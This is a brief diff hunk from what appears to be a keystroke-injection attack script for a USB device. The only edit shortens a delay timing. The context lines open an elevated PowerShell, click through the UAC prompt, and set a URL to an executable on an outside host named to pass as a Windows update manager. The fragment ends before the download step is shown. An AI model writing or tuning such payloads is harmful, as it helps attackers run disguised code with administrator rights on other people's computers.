@@ -62,7 +62,7 @@ GUI r
 DELAY 500
 STRING powershell
 CONTROL SHIFT ENTER
-DELAY 2000
+DELAY 750
 ALT y
 DELAY 1000
 STRING $url = "https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe"
